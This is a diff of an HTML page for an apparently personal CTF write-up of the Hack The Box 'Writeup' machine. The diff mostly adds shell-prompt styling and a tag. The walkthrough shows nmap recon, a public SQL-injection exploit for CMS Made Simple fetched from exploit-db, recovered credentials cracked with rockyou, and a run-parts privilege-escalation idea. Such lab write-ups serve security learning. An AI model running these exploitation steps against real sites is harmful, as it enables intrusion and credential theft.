@@ -8,8 +8,8 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
 <meta name="description" content="Writeup was my first machine I solved to start my CTF journey. It&amp;rsquo;s an easy rated box but still interesting and perfect to jump into the CTF bath!
 User Flag Recon Let&amp;rsquo;s start with the classic nmap:
-$ nmap -sV -sT -sC writeup.htb Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-01 10:39 CEST Nmap scan report for writeup.htb (10.10.10.138) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10&#43;deb9u6 (protocol 2."/>
-<meta name="keywords" content="hackthebox, ctf, cmsms, sqli, exploit, injection"/>
+[hg8@archbook ~]$ nmap -sV -sT -sC writeup.htb Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-01 10:39 CEST Nmap scan report for writeup.htb (10.10.10.138) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10&#43;deb9u6 (protocol 2."/>
+<meta name="keywords" content="hackthebox, ctf, cmsms, sqli, run-parts, exploit, injection"/>
 <meta name="robots" content="noodp"/>
 <link rel="canonical" href="/posts/writeup/" />
 
@@ -165,6 +165,8 @@ $ nmap -sV -sT -sC writeup.htb Starting Nmap 7.70 ( https://nmap.org ) at 2019-0
         
           #<a href="/tags/sqli/">sqli</a>&nbsp;
         
+          #<a href="/tags/run-parts/">run-parts</a>&nbsp;
+        
           #<a href="/tags/exploit/">exploit</a>&nbsp;
         
           #<a href="/tags/injection/">injection</a>&nbsp;
@@ -183,7 +185,7 @@ $ nmap -sV -sT -sC writeup.htb Starting Nmap 7.70 ( https://nmap.org ) at 2019-0
 <h1 id="user-flag">User Flag</h1>
 <h2 id="recon">Recon</h2>
 <p>Let&rsquo;s start with the classic nmap:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ nmap -sV -sT -sC writeup.htb           
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ nmap -sV -sT -sC writeup.htb           
 Starting Nmap 7.70 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2019-09-01 10:39 CEST
 Nmap scan report <span style="color:#66d9ef">for</span> writeup.htb <span style="color:#f92672">(</span>10.10.10.138<span style="color:#f92672">)</span>
 PORT   STATE SERVICE VERSION
@@ -212,7 +214,7 @@ Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</spa
 </code></pre><p>After digging a bit we found there is no Local File Inclusion vulnerabilities nor <code>vim</code> backup files accessible.</p>
 <h3 id="exploit">Exploit</h3>
 <p>Checking the source code inform us that the website was made using <code>CMS Made Simple</code> :</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#960050;background-color:#1e0010">$ http writeup.htb/writeup/index.php
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#960050;background-color:#1e0010">[hg8@archbook ~]$ http writeup.htb/writeup/index.php
 </span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#a6e22e">OK</span>
 Server<span style="color:#f92672">:</span> <span style="color:#ae81ff">Apache/2.4.25 (Debian)</span>
 Set-Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">CMSSESSID9d3962=lgt7j00rvndgl4; path=/</span>
@@ -239,8 +241,8 @@ Vary<span style="color:#f92672">:</span> <span style="color:#ae81ff">Accept-Enco
 <li>And even have a function to crack the found hashed password</li>
 </ol>
 <p>Let&rsquo;s try it :</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ wget https://www.exploit-db.com/raw/46635 -O cmssimple.py
-$ python cmssimple.py -u http://writeup.htb/writeup/ --crack -w <span style="color:#e6db74">&#34;~/SecLists/Passwords/Leaked-Databases/rockyou.txt&#34;</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ wget https://www.exploit-db.com/raw/46635 -O cmssimple.py
+<span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ python cmssimple.py -u http://writeup.htb/writeup/ --crack -w <span style="color:#e6db74">&#34;~/SecLists/Passwords/Leaked-Databases/rockyou.txt&#34;</span>
 <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Salt <span style="color:#66d9ef">for</span> password found: 5a599ef579066807
 <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Username found: jkr
 <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Email found: jkr@writeup.htb
@@ -266,8 +268,8 @@ jkr@writeup:~$
 <h3 id="recon-1">Recon</h3>
 <p>As a recon phase let&rsquo;s run <a href="https://github.com/DominicBreuker/pspy"><code>pspy</code></a> to check running process. And paying closer attention de process run as root.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ <span style="color:#75715e"># Attacker box</span>
-$ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
-$ scp pspy64 jkr@writeup.htb:~ 
+<span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
+<span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ scp pspy64 jkr@writeup.htb:~ 
 jkr@writeup.htb<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
 pspy64   100% 3006KB 111.9KB/s   00:26    
 </code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">jkr@writeup:~$ chmod +x pspy64  <span style="color:#f92672">&amp;&amp;</span> ./pspy64
@@ -282,7 +284,7 @@ pspy64   100% 3006KB 111.9KB/s   00:26
 05:37:29 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">1000</span> PID<span style="color:#f92672">=</span><span style="color:#ae81ff">11681</span>  | sshd: jkr@pts/2
 </code></pre></div><p>A few commands are run as <code>root</code> upon users login. Let&rsquo;s dig.</p>
 <p>First command that caught the attention is <code>run-parts --lsbsysinit /etc/update-motd.d</code></p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ man run-parts
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ man run-parts
 run-parts runs all the executable files named within constraints described below, found in directory <span style="color:#f92672">[</span>directory<span style="color:#f92672">]</span>.
 </code></pre></div><p>Sounds promising. If we can add a script to <code>/etc/update-motd.d</code> it will be executed as root on next login.</p>
 <p>Unfortunately we don&rsquo;t have writting rights to <code>/etc/update-motd.d</code> nor to the file present in it:</p>
